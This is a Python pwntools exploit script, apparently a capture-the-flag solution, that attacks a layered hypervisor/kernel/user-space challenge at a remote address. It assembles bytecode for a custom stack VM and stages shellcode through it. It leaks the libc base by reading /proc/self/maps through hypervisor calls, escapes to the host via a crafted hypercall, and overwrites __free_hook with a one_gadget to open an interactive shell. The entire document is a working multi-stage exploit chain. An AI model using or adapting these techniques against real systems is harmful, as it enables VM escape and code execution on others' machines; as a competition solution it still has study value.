from pwn import *

LOCAL = 0
DEDUG = 0
VERBOSE = 0

if VERBOSE:
    context(log_level = 'debug', arch='amd64')
else:
    context(log_level = 'info', arch='amd64')

context.terminal = ['tmux', 'splitw', '-h']

if LOCAL:
    # io = process(['./hypervisor.elf', 'kernel.bin', 'ld.so.2', './user.elf'], aslr=False)
    io = process(['./hypervisor.elf', 'kernel.bin', 'ld.so.2', './user.elf'])
    if DEDUG:
        gdb.attach(io, 'b *0x555555556856\nb *0x0000555555556143 if $rdx==0x1000\nb *0x0000555555555F5E\nb *0x0000555555556143 if $rdx==0x8\n')
else:
    io = remote('35.200.23.198', 31733)

def my_asm(instrcutions):
    instrcutions = filter(lambda ins: ins is not '', map(lambda ins: ins.strip(), instrcutions.split('\n')))
    bytecodes = ''
    for ins in instrcutions:
        data = ins.split(' ')
        op = data[0]
        if op == 'pushb':
            bytecodes += chr(int(data[1]) + 97)
        elif op == 'pushd':
            if data[1].startswith('0x'):
                bytecodes += str(int(data[1], 16))
            else:
                bytecodes += data[1]
        elif op == 'dup':
            bytecodes += chr(0x24)
        elif op == 'pop':
            bytecodes += chr(0x25)
        elif op == 'and':
            bytecodes += chr(0x26)
        elif op == 'mul':
            bytecodes += chr(0x2A)
        elif op == 'add':
            bytecodes += chr(0x2B)
        elif op == 'write':
            bytecodes += chr(0x2C)
        elif op == 'minus':
            bytecodes += chr(0x2D)
        elif op == 'writed':
            bytecodes += chr(0x2E)
        elif op == 'div':
            bytecodes += chr(0x2F)
        elif op == 'store':
            bytecodes += chr(0x3A)
        elif op == 'fetch':
            bytecodes += chr(0x3B)
        elif op == 'eql':
            bytecodes += chr(0x3D)
        elif op == 'gt':
            bytecodes += chr(0x3E)
        elif op == 'rot':
            bytecodes += chr(0x40)
        elif op == 'swap':
            bytecodes += chr(0x5C)
        elif op == 'neg':
            bytecodes += chr(0x5F)
        elif op == 'or':
            bytecodes += chr(0x7C)
        elif op == 'not':
            bytecodes += chr(0x7E)

    return bytecodes

def to_int(val):
    if val.startswith('-'):
        return int((1<<32) - int(val[1:]))
    else:
        return int(val)

def put_shellcode(shellcode):
    result = ''
    push_count = 0
    for i in range(0, len(shellcode), 4):
        val = u32(shellcode[i:i+4].ljust(4, '\x00'))
        result += my_asm('pushd %d\nneg\nneg' % val)
        push_count += 1
    for i in range(push_count):
        result += my_asm('pop')
    return result

def OFFSET(v, bits):
    return ((v >> bits) & 0x1ff)

def PML4OFF(v):
    return OFFSET(v, 39)

def PDPOFF(v):
    return OFFSET(v, 30)

def PDOFF(v):
    return OFFSET(v, 21)

bytecodes = my_asm('pushd %d\nneg\nneg' % 0xffffffe4)

bytecodes2 = my_asm(
    '''
    swap
    pushd %d
    add
    pushb 0
    store
    pop
    pop
    pop
    pop
    pushb 0
    fetch
    write
    ''' % (0x2018f2)
    )

shellcode = asm(
    '''
    mov    r9d,0x0
    mov    r8d,0xffffffffffffffff
    mov    ecx, 0x10
    mov    edx,0x3
    mov    esi,0x1739000
    mov    edi,0
    mov    rax,9
    syscall

    mov rsi, rax
    mov rax, 0
    mov rdi, 0
    mov rdx, 0xf000
    syscall
    '''
    )

bytecodes += put_shellcode(shellcode) + bytecodes2

io.recvuntil('down.\n')
io.sendline(bytecodes)

hp_read = 0xdc2
hp_open = 0xe7e
hp_write = 0xe8a
hp_access = 0xe1e
hp_lseek = 0xee6
hypercall = 0xe72

shellcode2  = '\x90' * 0x17f

shellcode2 += asm(
    '''
    mov rax, 0x007370616d2f666c
    push rax
    mov rax, 0x65732f636f72702f
    push rax
    mov rdi, rsp
    mov rsi, 0x8000000000
    xor rdi, rsi
    '''
    )
shellcode2 += asm('call $+%d' % (hp_open - len(shellcode2)))
print shellcode2.encode('hex')
shellcode2 += asm(
    '''
    mov rsi, 0xb800
    mov rdi, rax
    mov rdx, 0x800
    ''' 
    )
shellcode2 += asm('call $+%d' % (hp_read - len(shellcode2)))

shellcode2 += asm(
    '''
    mov rsi, 0xb800
    mov rdi, 1
    mov rdx, 0x800
    '''
    )
shellcode2 += asm('call $+%d' % (hp_write - len(shellcode2)))

shellcode3_addr = 0xb000
shellcode2 += asm(
    '''
    mov rdi, 0
    mov rsi, %d
    mov rdx, 0x1000 
    ''' % (shellcode3_addr) 
    )
shellcode2 += asm('call $+%d' % (hp_read - len(shellcode2)))

shellcode2 += asm('jmp $+%d' % (shellcode3_addr - len(shellcode2)))

io.sendline(shellcode2)

data = io.recvuntil('[vsyscall]\n')
for _ in data.split('\n'):
    if '/lib/x86_64-linux-gnu/libc-2.27.so' in _:
        print _
        libc_base = int(_.split('-')[0], 16)
        log.info('libc base %#x' % libc_base)
        break

vmem = libc_base - 0x2000000
shellcode3 = asm(
        '''
        mov edi, 0x8008
        mov esi, %d
        ''' % (shellcode3_addr+0x200))
shellcode3 += asm('call $-%d' % (shellcode3_addr + len(shellcode3) - hypercall))

shellcode3 += asm(
    '''
    mov rdi, 0
    mov rsi, 0x1fb088
    mov rdx, 0x8
    ''' 
    )
shellcode3 += asm('call $-%d' % (shellcode3_addr + len(shellcode3) - hp_read))

one_gadget = libc_base + 0x4f322
system = libc_base + 0x4F440
free_hook = 0x3ed8e8
shellcode3 += asm(
    '''
    mov rdi, %d
    mov rsi, %d
    mov [rdi], rsi
    ''' % (0x80023ed8e8, one_gadget))

shellcode3 += asm(
    '''
    mov rdi, 1
    mov rsi, 0xdeadbeafdeadbeaf
    mov rdx, 0x8
    ''' 
    )
shellcode3 += asm('call $-%d' % (shellcode3_addr + len(shellcode3) - hp_write))
assert len(shellcode3) <= 0x200
shellcode3  = shellcode3.ljust(0x200, '\xcc')
shellcode3 += p64(0x4)+p64(0x4020AE46)+p64(shellcode3_addr + 0x200 + 8*3)
shellcode3 += p32(1)+p32(0)+p64(0x2000000)+p64(0x2000000)+p64(vmem+0x2000000)

io.sendline(shellcode3)
#raw_input()
io.send(p64(0x2200083))
io.interactive()
